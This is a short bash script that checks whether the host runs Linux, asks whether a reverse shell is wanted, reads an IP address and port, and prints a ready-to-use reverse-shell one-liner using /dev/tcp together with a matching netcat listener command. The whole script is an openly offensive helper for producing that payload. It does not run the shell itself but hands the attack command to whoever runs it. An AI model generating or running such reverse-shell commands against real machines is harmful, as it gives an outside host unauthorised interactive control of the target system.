#!/bin/bash

echo "Checking OS version / name"
echo
os_info=$(uname -a)  

echo "OS Info: $os_info"

if [[ "$os_info" == *"Linux"* ]]; then
    echo
    echo "Do you want a reverse shell? [y / n]"
    read answer

    if [[ "$answer" == "y" ]]; then
        echo
        echo "Provide IP and Port!"
        echo
        read -p "IP Address: " ip_addr
        read -p "Port: " port
        echo
        echo "SHELL --> sh -i >& /dev/tcp/$ip_addr/$port 0>&1"
        echo "LISTENER --> nc -lvnp $port"
    else
        echo "No reverse shell requested."
    fi
else
    echo "Not a Linux OS"
fi
